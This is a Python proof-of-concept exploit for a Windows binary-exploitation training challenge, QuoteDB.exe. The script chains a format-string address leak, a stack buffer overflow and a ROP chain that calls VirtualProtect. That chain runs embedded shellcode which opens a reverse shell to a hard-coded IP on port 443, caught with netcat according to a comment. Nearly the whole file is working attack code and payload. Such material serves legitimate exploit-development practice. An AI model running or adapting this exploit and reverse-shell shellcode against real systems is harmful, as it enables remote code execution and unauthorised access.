#!/usr/bin/python3
# Quote_DB PoC
# Author: ApexPredator
# Link to Vulnerable App: https://github.com/bmdyy/quote_db
# License: MIT
# This script is one possible solution to bmdyy's QuouteDB.exe challenge.
import socket
import sys
from struct import pack

def update_quote(server, port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    print("[+] Updating quote #9 with shellcode and address leak")
    # Custom reverse shell. Use nc -nlvp 443 to recieve shell \xc0\xa8\x31\x4a is the IP in reverse order, change to match your IP.
    shellcode = (b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04\x89\x45\x20\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x05\x70\xfa\xff\xff\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\x6a\x06\x6a\x01\x6a\x02\xff\x55\x20\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x31\x4a\x66\xb8\x01\xbb\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xfe\xc4\x50\xfe\xcc\x31\xc9\xb1\x0a\x50\xe2\xfd\xb0\x44\x50\x89\xe7\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x66\x2d\x90\x03\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10")



    buf = pack("<L", (0x00000387))
    buf += pack("<L", (0x0000009))
    buf += b'%x:' * 0x4
    buf += shellcode

    s.send(buf)
    s.recv(1024)
    s.close()
    print("[+] Updated quote #9")

    return

def leak_addr(server, port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    print("[+] Leaking address...")
    buf = pack("<L", (0x00000385))
    buf += pack("<L", (0x0000009))

    s.send(buf)
    response = s.recv(1024)
    leaks = response.split(b':')
    dll_leak = int(leaks[0], 16)
    print("[+] msvcrt Dll leaked address 0x%x"  %dll_leak)
    #print(hex(int(responsedll_leak, 16)))
    dll_base = dll_leak - 0x666b0
    print("[+] msvcrt Dll base address 0x%x" %dll_base)
    VP_address = dll_base + 0xb61ac
    print("[+] address to VirtualProtect pointer 0x%x" %VP_address)
    #s.recv(5)
    #responseexe_leak = s.recv(7)
    exe_leak = int(leaks[2], 16)
    print("[+] executable address leak 0x%x" %exe_leak)
    shell_code = exe_leak + 0x12b51
    exe_base = exe_leak - 0x173b
    print("[+] base address of executable 0x%x" %exe_base)
    print("[+] address to beginning of shellcode 0x%x" %shell_code)
    s.close()

    return dll_base, VP_address, shell_code, exe_base

def rvsh(server, port, dll_base, VP_address, shell_code, exe_base):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    buf = bytearray([0x41]*0x810)
    eip = pack("<L", (exe_base + 0x09e4d)) # 0x00409e4d: push esp ; add esp, 0x18 ; pop ebx ; ret  ;

    rop = pack("<L", (0x42424242)) # junk
    rop += pack("<L", (0x42424242)) # junk
    rop += pack("<L", (0x42424242)) # junk
    rop += pack("<L", (0x42424242)) # junk
    rop += pack("<L", (0x42424242)) # junk
    rop += pack("<L", (0x42424242)) # junk

    rop += pack("<L", (exe_base+0x2b37)) # 0x00402b37: pop eax ; pop ecx ; ret  ;;
    rop += pack("<L", (VP_address))
    rop += pack("<L", (0x42424242)) # junk in to ecx
    rop += pack("<L", (exe_base+0x1e6c)) # 0x00401e6c: mov eax, dword [eax] ; add ecx, 0x05 ; pop edx ; ret  ;
    rop += pack("<L", (0x42424242)) # junk in to edx
    rop += pack("<L", (exe_base+0x1be5)) # 0x00401be5: push eax ; ret  ;
    vp = pack("<L", (shell_code))
    vp += pack("<L", (shell_code))
    vp += pack("<i", 0x20C)
    vp += pack("<i", 0x40)
    vp += pack("<i", (shell_code+0x200))
    buf += eip + rop + vp
    buf += bytearray([0x43] * (0x1000 - len(buf)))

    s.send(buf)
    #s.recv(1024)
    s.close()

    return

def main():

    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = 3700



    update_quote(server, port)
    dll_base, VP_address, shell_code, exe_base = leak_addr(server, port)
    rvsh(server, port, dll_base, VP_address, shell_code, exe_base)

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
     main()
